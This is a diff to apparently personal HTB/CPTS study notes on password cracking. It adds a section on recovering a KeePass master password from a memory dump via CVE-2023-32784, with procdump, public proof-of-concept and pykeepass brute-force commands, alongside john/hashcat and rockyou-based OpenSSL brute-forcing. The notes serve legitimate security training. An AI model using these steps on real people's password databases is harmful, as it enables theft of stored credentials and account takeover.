@@ -4,8 +4,8 @@ type: technique
 tags: [htb, linux, password-cracking, post-exploitation, windows]
 phase: post-exploitation
 date_created: 2026-05-08
-date_updated: 2026-06-30
-sources: [cpts-password-attacks]
+date_updated: 2026-08-13
+sources: [cpts-password-attacks, cve-2023-32784]
 ---
 
 # Password Cracking
@@ -211,6 +211,20 @@ john --wordlist=rockyou.txt keepass.hash          # or hashcat -m 13400
 #   (their DPAPI unlocks it): `start "" KeePass.exe db.kdbx` -> master-key dialog shows only "Windows
 #   user account" ticked -> OK. Read entries via double-click + the `...` reveal button (screenshot;
 #   headless RDP clipboard is unreliable). A <KeyFile> association means find the .key/.keyx instead.
+
+# KeePass master password from a MEMORY DUMP (CVE-2023-32784, KeePass 2.x < 2.54).
+# The masked master-password box leaves residual UTF-16 strings in process memory:
+# EVERY character except the FIRST is recoverable, no cracking needed. Dump + recover:
+#   procdump.exe -accepteula -ma <keepass-pid> ks.dmp     # or Task Manager > Create dump file
+#   git clone https://github.com/CMEPW/keepass-dump-masterkey
+#   python3 keepass-dump-masterkey/poc.py ks.dmp          # -> "?NoWaYIcanF0rGetThis123" (? = leading ●)
+# The leading ● is the ONE unrecoverable char. Brute just that char against the kdbx:
+#   python3 -c 'import string;from pykeepass import PyKeePass
+#   body="NoWaYIcanF0rGetThis123"                          # the recovered tail from poc.py
+#   for c in string.printable:
+#       try: PyKeePass("db.kdbx",password=c+body); print("PW:",c+body); break
+#       except: pass'
+# When you have both a .kdbx AND a process/memory dump, this beats cracking the Argon2 KDF.
 
 # OpenSSL-encrypted GZIP
 for i in $(cat rockyou.txt); do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null | tar xz; done
